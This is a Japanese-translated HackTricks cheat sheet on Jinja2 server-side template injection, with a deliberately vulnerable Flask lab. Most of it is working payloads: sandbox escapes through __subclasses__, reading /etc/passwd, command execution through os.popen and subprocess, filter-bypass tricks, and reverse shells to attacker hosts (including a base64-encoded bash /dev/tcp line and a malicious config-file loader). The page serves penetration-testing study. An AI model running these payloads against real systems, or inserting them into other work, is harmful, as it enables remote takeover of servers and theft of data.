# Jinja2 SSTI

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* あなたは**サイバーセキュリティ会社**で働いていますか？ HackTricksであなたの**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。これは、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングのトリックを共有するために、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## **Lab**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
## **その他**

### **デバッグステートメント**

デバッグ拡張が有効になっている場合、`debug`タグを使用して現在のコンテキストや利用可能なフィルターとテストをダンプすることができます。これは、デバッガをセットアップせずにテンプレートで使用できるものを確認するために役立ちます。
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}





</pre>
```
ソース: [https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)

### **すべての設定変数をダンプする**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}




```
## **Jinjaインジェクション**

まず、Jinjaインジェクションでは、**サンドボックスからの脱出方法を見つけ**、通常のPythonの実行フローにアクセスを回復する必要があります。そのためには、**サンドボックスからアクセス可能な**非サンドボックス環境のオブジェクトを**悪用する必要があります**。

### グローバルオブジェクトへのアクセス

例えば、コード`render_template("hello.html", username=username, email=email)`では、usernameとemailのオブジェクトは**非サンドボックスのPython環境から来ており**、**サンドボックス環境内でアクセス可能**です。\
\*\*\*\*さらに、**常にサンドボックス環境からアクセス可能な**他のオブジェクトもあります。これらは以下の通りです：
```
[]
''
()
dict
config
request
```
### \<class 'object'>の回復

次に、これらのオブジェクトからクラス **`<class 'object'>`** にアクセスする必要があります。これは、定義済みのクラスを**回復**するためです。このオブジェクトからは、**`__subclasses__`** メソッドを呼び出して、**非サンドボックス化された**Python環境からすべてのクラスにアクセスできます。

その **オブジェクトクラス** にアクセスするためには、**クラスオブジェクト** にアクセスし、**`__base__`**、**`__mro__()[-1]`**、または **`.`** **`mro()[-1]`** にアクセスする必要があります。そして、この **オブジェクトクラス** に到達した後、**`__subclasses__()`** を呼び出します。

以下は、これらの例です：
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}






# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCEの回避

`<class 'object'>`を回復し、`__subclasses__`を呼び出したことで、ファイルの読み書きやコードの実行が可能になりました。

`__subclasses__`の呼び出しにより、**数百の新しい関数にアクセスする機会**が与えられました。ファイルクラスにアクセスして**ファイルの読み書き**を行ったり、`os`のような**コマンドの実行を許可するクラス**にアクセスすることで、満足することができます。

**リモートファイルの読み書き**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**RCE (Remote Code Execution)**

RCE（リモートコード実行）は、攻撃者がリモートでコードを実行することができる脆弱性です。これにより、攻撃者は対象システムに悪意のあるコードを注入し、システムを乗っ取ることができます。

RCEは、ウェブアプリケーションのセキュリティにおいて非常に重要な脆弱性です。攻撃者は、RCEを利用してシステム内の機密情報を盗み出したり、システムを完全に制御したりすることができます。

RCEの攻撃手法はさまざまですが、一般的な手法には、サーバーサイドテンプレートインジェクション（SSTI）やコマンドインジェクションがあります。これらの攻撃手法を理解し、適切な対策を講じることが重要です。

RCEの脆弱性を悪用する攻撃者からシステムを保護するためには、セキュリティパッチの適用、入力検証とエスケープの実施、最小特権の原則の適用など、セキュリティ対策を継続的に実施する必要があります。
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Calling os.popen without guessing the index of the class

{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


```
**さらに多くのクラス**を学ぶために、**エスケープ**に使用できる**クラス**を**確認**できます。

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### フィルターバイパス

#### 一般的なバイパス

これらのバイパスは、**一部の文字を使用せずに**オブジェクトの**属性にアクセス**することを可能にします。\
これらのバイパスのいくつかは、前の例で既に見てきましたが、ここでまとめてみましょう:
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}




```
* [**グローバルオブジェクトにアクセスするための他のオプションはこちら**](jinja2-ssti.md#accessing-global-objects)
* [**オブジェクトクラスにアクセスするための他のオプションはこちら**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**オブジェクトクラスなしでRCEを取得するためにはこちらを読んでください**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**HTMLエンコーディングの回避**

デフォルトでは、Flaskはセキュリティ上の理由からテンプレート内のすべてのHTMLをエンコードします。
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**`safe`**フィルターを使用すると、次のように、**HTMLエンコードされずに**JavaScriptやHTMLをページに**注入**することができます。
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**悪意のある設定ファイルを書くことによるRCE（リモートコード実行）**

In some cases, the application may load configuration files that are written in a templating language like Jinja2. If the application allows user input to be directly written into these configuration files without proper sanitization, it can lead to Server-Side Template Injection (SSTI) vulnerabilities.

場合によっては、アプリケーションがJinja2のようなテンプレート言語で書かれた設定ファイルを読み込むことがあります。アプリケーションが適切なサニタイズ処理を行わずにユーザー入力を直接これらの設定ファイルに書き込むことを許可している場合、それはサーバーサイドテンプレートインジェクション（SSTI）の脆弱性につながる可能性があります。

One way to exploit this vulnerability is by writing an evil configuration file that contains malicious code. The code can be written in the templating language itself and can execute arbitrary commands on the server.

この脆弱性を悪用する方法の一つは、悪意のあるコードを含む設定ファイルを書くことです。コードはテンプレート言語自体で書かれ、サーバー上で任意のコマンドを実行することができます。

For example, if the application allows user input to be written into a Jinja2 configuration file, an attacker can craft a payload that includes a template expression that executes arbitrary commands. When the configuration file is loaded by the application, the payload will be executed, resulting in remote code execution.

たとえば、アプリケーションがユーザー入力をJinja2の設定ファイルに書き込むことを許可している場合、攻撃者は任意のコマンドを実行するテンプレート式を含むペイロードを作成することができます。アプリケーションによって設定ファイルが読み込まれると、ペイロードが実行され、リモートコード実行が行われます。

To prevent this type of attack, it is important to properly sanitize user input before writing it into configuration files. Input validation and output encoding can help mitigate the risk of SSTI vulnerabilities.

このような攻撃を防ぐためには、設定ファイルに書き込む前にユーザー入力を適切にサニタイズすることが重要です。入力の検証と出力のエンコーディングは、SSTIの脆弱性のリスクを軽減するのに役立ちます。
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## いくつかの文字を使用しない場合

**`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`**を使用せずに
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}



```
## **\<class 'object'>**を使用しないJinjaインジェクション

[**グローバルオブジェクト**](jinja2-ssti.md#accessing-global-objects)から、そのクラスを使用せずに**RCEに到達する**別の方法があります。\
これらのグローバルオブジェクトから**関数**にアクセスできれば、**`__globals__.__builtins__`**にアクセスでき、そこから**RCE**は非常に**簡単**になります。

次のコマンドを使用して、アクセス可能な**`request`**、**`config`**、および他の興味深い**グローバルオブジェクト**から**関数**を見つけることができます。
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
いくつかの関数を見つけたら、次のコマンドで組み込み関数を回復できます。
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}

## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
## 参考文献

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* [ここでブラックリストに登録された文字をバイパスするためのattrトリックをチェックしてください](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3).
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
